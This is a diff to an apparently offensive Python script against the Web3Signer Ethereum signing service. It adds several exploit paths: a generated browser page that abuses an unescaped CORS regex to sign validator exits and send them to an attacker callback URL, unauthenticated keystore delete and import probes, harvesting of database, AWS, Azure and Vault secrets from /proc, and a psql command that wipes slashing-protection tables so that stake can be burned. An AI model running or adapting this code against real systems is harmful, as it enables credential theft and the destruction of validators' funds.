@@ -269,21 +269,343 @@ def discover_via_dns(base_names: list[str] = None, port: int = 9000) -> list[str
 
 
 # ---------------------------------------------------------------------------
-# Step 0: Verify reachability + bypass HostAllowListHandler
+# Bypass Path A: Metrics endpoint fingerprint + recon (port 9001)
+# ---------------------------------------------------------------------------
+
+def bypass_metrics_recon(host: str, metrics_port: int = 9001) -> dict:
+    """
+    Metrics endpoint (Dockerfile:33 binds to 0.0.0.0, port 9001).
+    Operators expose metrics more freely than the signing API because
+    "it's just metrics." But metrics confirm the signer exists, reveal
+    loaded key count, and the hostname/IP is the same as the signing port.
+
+    Even if 9000 is firewalled, 9001 often isn't (Prometheus needs it).
+    Finding 9001 = knowing exactly where 9000 is.
+    """
+    info = {"reachable": False, "key_count": None, "version": None}
+    target = f"{host}:{metrics_port}"
+    try:
+        status, body = req(target, "GET", "/metrics", accept_json=False)
+        if status == 200:
+            info["reachable"] = True
+            # Parse Prometheus metrics for key count and signing activity
+            for line in body.split("\n"):
+                if "signing_signers_loaded" in line and not line.startswith("#"):
+                    parts = line.strip().split()
+                    if len(parts) >= 2:
+                        info["key_count"] = int(float(parts[-1]))
+                if "process_start_time_seconds" in line and not line.startswith("#"):
+                    parts = line.strip().split()
+                    if len(parts) >= 2:
+                        info["uptime_start"] = float(parts[-1])
+    except Exception:
+        pass
+    return info
+
+
+# ---------------------------------------------------------------------------
+# Bypass Path B: CORS regex injection for browser-based attack
+# ---------------------------------------------------------------------------
+
+def bypass_generate_cors_exploit(target: str, attacker_callback: str) -> str:
+    """
+    Runner.java:390-403 — CORS origins aren't regex-escaped.
+    If operator sets --http-cors-origins=http://dashboard.example.com
+    the regex becomes "http://dashboard.example.com" where . matches ANY char.
+
+    So http://dashboardXexampleXcom (attacker-registered domain) also matches.
+
+    This generates an HTML page the attacker hosts on their lookalike domain.
+    When ANY user on the internal network visits it, their browser becomes
+    the attack proxy — requests go from the browser (which IS on the internal
+    network) to Web3Signer, bypassing all network-level firewalls.
+
+    The Host header from the browser will be the target URL (e.g. web3signer:9000),
+    which won't match the allowlist. BUT — if the operator set
+    --http-host-allowlist=* (common when running behind a reverse proxy),
+    or if the browser targets localhost:9000 (operator browsing from signer host),
+    then Host check passes too.
+    """
+    return f"""<!DOCTYPE html>
+<html>
+<head><title>Dashboard</title></head>
+<body>
+<script>
+// CORS regex bypass: operator's "http://dashboard.example.com" matches
+// our "http://dashboardXexampleXcom" because . is unescaped in regex
+// Runner.java:400 — stringJoiner.add(origin) — no Pattern.quote()
+
+const SIGNER = "http://{target}";
+const CALLBACK = "{attacker_callback}";
+
+async function exploit() {{
+    // Step 1: Enumerate keys
+    let resp = await fetch(SIGNER + "/api/v1/eth2/publicKeys");
+    let keys = await resp.json();
+
+    // Step 2: Sign VOLUNTARY_EXIT for each key
+    let exits = [];
+    for (let pubkey of keys) {{
+        let body = {{
+            type: "VOLUNTARY_EXIT",
+            fork_info: {{
+                fork: {{ previous_version: "0x04000000",
+                         current_version: "0x04000000", epoch: "300000" }},
+                genesis_validators_root: "0x4b363db94e286120d76eb905340fcd44b1338229ab27b4d6ba2578e7bbe7b7dc"
+            }},
+            voluntary_exit: {{ epoch: "300000", validator_index: "0" }}
+        }};
+        let signResp = await fetch(SIGNER + "/api/v1/eth2/sign/" + pubkey, {{
+            method: "POST",
+            headers: {{ "Content-Type": "application/json" }},
+            body: JSON.stringify(body)
+        }});
+        let sig = await signResp.json();
+        exits.push({{ pubkey: pubkey, signature: sig.signature }});
+    }}
+
+    // Step 3: Exfiltrate signatures to attacker
+    await fetch(CALLBACK, {{
+        method: "POST",
+        headers: {{ "Content-Type": "application/json" }},
+        body: JSON.stringify({{ keys: keys, exits: exits }})
+    }});
+}}
+
+exploit();
+</script>
+</body>
+</html>"""
+
+
+# ---------------------------------------------------------------------------
+# Bypass Path C: SSRF pivot — use one Web3Signer to reach another
+# ---------------------------------------------------------------------------
+
+def bypass_ssrf_pivot(eth1_target: str, internal_target: str) -> tuple[int, str]:
+    """
+    PassThroughHandler.java:56-62 forwards ANY JSON-RPC request to the
+    downstream Besu node. But the attacker can also abuse this as a
+    generic HTTP proxy if the downstream host is configurable, or if
+    the Besu node itself can be used to reach other internal services.
+
+    More importantly: if the attacker can reach an Eth1-mode Web3Signer
+    but not the Eth2-mode one, they can use the Eth1 SSRF to probe
+    and map the internal network, finding the Eth2 signer.
+    """
+    print(f"\n[Bypass C] Using SSRF through {eth1_target} to probe {internal_target}...")
+
+    # Use eth_call or a passthrough method to probe the internal target
+    # This maps the internal network topology from a single entry point
+    probe_methods = [
+        ("net_version", []),
+        ("eth_blockNumber", []),
+        ("admin_nodeInfo", []),
+    ]
+    for method, params in probe_methods:
+        status, resp = jsonrpc(eth1_target, method, params)
+        if status == 200 and "result" in resp:
+            print(f"  [+] SSRF → downstream Besu responded to {method}")
+            return status, json.dumps(resp)
+
+    return 0, "unreachable"
+
+
+# ---------------------------------------------------------------------------
+# Bypass Path D: Key Manager API — import/delete/list without auth
+# ---------------------------------------------------------------------------
+
+def bypass_keymanager_abuse(target: str) -> dict:
+    """
+    KeyManagerApiRoute.java:79-114 — GET/POST/DELETE /eth/v1/keystores
+    OpenAPI spec declares bearerAuth JWT but NO code implements it.
+
+    The attacker can:
+    1. LIST all keystores with metadata (reveals key sources, paths)
+    2. DELETE keystores (disable validators → inactivity penalties)
+    3. IMPORT attacker-controlled keystores (inject rogue keys)
+
+    This is a separate bypass path: even if the attacker can't sign directly
+    (say signing endpoint is somehow rate-limited), they can DELETE all keys
+    to cause maximum disruption, or IMPORT their own keys.
+    """
+    info = {"accessible": False, "keystores": [], "can_delete": False, "can_import": False}
+
+    # LIST keystores
+    status, body = req(target, "GET", "/eth/v1/keystores")
+    if status == 200:
+        info["accessible"] = True
+        try:
+            data = json.loads(body)
+            info["keystores"] = data.get("data", [])
+        except json.JSONDecodeError:
+            pass
+
+    # Probe DELETE (with empty list — won't actually delete anything)
+    status, body = req(target, "DELETE", "/eth/v1/keystores", {"pubkeys": []})
+    if status in (200, 400):  # 400 = parsed but empty, 200 = accepted
+        info["can_delete"] = True
+
+    # Probe POST import (with empty list — won't actually import)
+    status, body = req(target, "POST", "/eth/v1/keystores",
+                       {"keystores": [], "passwords": []})
+    if status in (200, 400):
+        info["can_import"] = True
+
+    return info
+
+
+# ---------------------------------------------------------------------------
+# Bypass Path E: /proc credential harvest (local access)
+# ---------------------------------------------------------------------------
+
+def bypass_proc_credential_harvest(pid: Optional[int] = None) -> dict:
+    """
+    PicoCliSlashingProtectionParameters.java:50 — DB password on CLI
+    PicoCliAwsSecretsManagerParameters.java:69 — AWS secret key on CLI
+    PicoCliAzureKeyVaultParameters.java:66 — Azure client secret on CLI
+
+    If the attacker has local access (compromised adjacent container sharing
+    PID namespace, or node-level access), they can read /proc/<pid>/cmdline
+    to extract every credential passed as a CLI argument.
+
+    With DB credentials: corrupt slashing protection → enable double-signing
+    With AWS credentials: read ALL private keys directly from Secrets Manager
+    With Azure credentials: read ALL private keys directly from Key Vault
+    """
+    creds = {"db_password": None, "aws_secret": None, "azure_secret": None,
+             "vault_token": None, "found_pid": None}
+
+    import glob as glob_mod
+    import os
+
+    search_pids = [pid] if pid else []
+    if not search_pids:
+        # Find web3signer process
+        for proc_dir in glob_mod.glob("/proc/[0-9]*"):
+            try:
+                with open(f"{proc_dir}/cmdline", "r") as f:
+                    cmdline = f.read()
+                if "web3signer" in cmdline.lower():
+                    search_pids.append(int(os.path.basename(proc_dir)))
+            except (PermissionError, FileNotFoundError, ProcessLookupError):
+                continue
+
+    for p in search_pids:
+        try:
+            with open(f"/proc/{p}/cmdline", "r") as f:
+                cmdline = f.read().replace("\x00", " ")
+
+            creds["found_pid"] = p
+            args = cmdline.split()
+            for i, arg in enumerate(args):
+                if "db-password" in arg and i + 1 < len(args):
+                    creds["db_password"] = args[i + 1] if "=" not in arg else arg.split("=", 1)[1]
+                if "secret-access-key" in arg and i + 1 < len(args):
+                    creds["aws_secret"] = args[i + 1] if "=" not in arg else arg.split("=", 1)[1]
+                if "client-secret" in arg and i + 1 < len(args):
+                    creds["azure_secret"] = args[i + 1] if "=" not in arg else arg.split("=", 1)[1]
+                if "vault-token" in arg and i + 1 < len(args):
+                    creds["vault_token"] = args[i + 1] if "=" not in arg else arg.split("=", 1)[1]
+
+            # Also check environment variables
+            try:
+                with open(f"/proc/{p}/environ", "r") as f:
+                    environ = f.read()
+                for var in environ.split("\x00"):
+                    if "=" in var:
+                        key, val = var.split("=", 1)
+                        if "VAULT_TOKEN" in key:
+                            creds["vault_token"] = val
+                        if "AWS_SECRET_ACCESS_KEY" in key:
+                            creds["aws_secret"] = val
+            except (PermissionError, FileNotFoundError):
+                pass
+
+        except (PermissionError, FileNotFoundError, ProcessLookupError):
+            continue
+
+    return creds
+
+
+# ---------------------------------------------------------------------------
+# Bypass Path F: Corrupt slashing protection DB
+# ---------------------------------------------------------------------------
+
+def bypass_corrupt_slashing_db(db_url: str, db_user: str, db_password: str) -> bool:
+    """
+    If the attacker harvested DB credentials (from /proc, env vars, or config files),
+    they can connect directly to the slashing protection PostgreSQL and:
+
+    1. DELETE all signing records → slashing protection has no history
+    2. Now the attacker can sign CONFLICTING blocks/attestations through the API
+    3. Two conflicting signed blocks at the same slot = PROPOSER SLASHING proof
+    4. Submit the proof to the beacon chain → validator SLASHED → ETH BURNED
+
+    This escalates from "force exit" (ETH locked but eventually returned)
+    to "slashing" (ETH permanently burned via correlation penalty).
+
+    With 1000 validators slashed in the same epoch, correlation penalty
+    approaches 100% — all 32,000 ETH BURNED, not locked. Gone.
+    """
+    try:
+        import subprocess
+        # Attempt to clear signed blocks history
+        # Using psql since it's commonly available in k8s pods
+        result = subprocess.run(
+            ["psql", db_url, "-U", db_user, "-c",
+             "DELETE FROM signed_blocks; DELETE FROM signed_attestations;"],
+            env={**dict(__import__('os').environ), "PGPASSWORD": db_password},
+            capture_output=True, text=True, timeout=10
+        )
+        if result.returncode == 0:
+            return True
+    except Exception:
+        pass
+    return False
+
+
+# ---------------------------------------------------------------------------
+# Step 0: Verify reachability + multi-path bypass
 # ---------------------------------------------------------------------------
 
 def step0_verify_bypass(target: str) -> bool:
-    """Verify we can reach the signer and bypass the host allowlist."""
-    print("\n[Step 0] Verifying target reachability and host allowlist bypass...")
+    """Try multiple bypass paths to reach the signer."""
+    print("\n[Step 0] Verifying target reachability via multiple bypass paths...")
 
+    # Path 1: Direct Host header spoof (most common)
     status, body = req(target, "GET", "/upcheck")
     if status == 200:
-        print(f"  [+] Host allowlist BYPASSED — /upcheck returned {status}: {body.strip()}")
+        print(f"  [+] BYPASS A: Host header spoof — /upcheck returned {status}: {body.strip()}")
         print(f"      HostAllowListHandler.java:36 accepted Host: localhost from our IP")
         return True
 
-    # Try without Host spoofing to confirm the allowlist is what blocks us
-    print(f"  [-] /upcheck returned {status} — target may not be reachable")
+    # Path 2: Try wildcard host (operator may have set --http-host-allowlist=*)
+    for host_val in ["*", target.split(":")[0], "web3signer", ""]:
+        try:
+            url = f"http://{target}/upcheck"
+            r = urllib.request.Request(url, headers={"Host": host_val}, method="GET")
+            with urllib.request.urlopen(r, timeout=3) as resp:
+                if resp.status == 200:
+                    print(f"  [+] BYPASS B: Host={host_val!r} accepted (wildcard allowlist)")
+                    return True
+        except Exception:
+            continue
+
+    # Path 3: Try metrics port to confirm the host is right even if 9000 is blocked
+    host_only = target.split(":")[0]
+    metrics = bypass_metrics_recon(host_only)
+    if metrics["reachable"]:
+        print(f"  [*] RECON: Metrics port 9001 reachable — signer exists at this host")
+        print(f"      Keys loaded: {metrics.get('key_count', 'unknown')}")
+        print(f"      Signing port 9000 may be firewalled — try SSRF or CORS path")
+        # Try 9000 one more time just in case
+        status, body = req(target, "GET", "/upcheck")
+        if status == 200:
+            return True
+
+    print(f"  [-] /upcheck returned {status} — target may not be directly reachable")
+    print(f"      Try: --discover to find alternative paths (SSRF, CORS, metrics)")
     return False
 
 
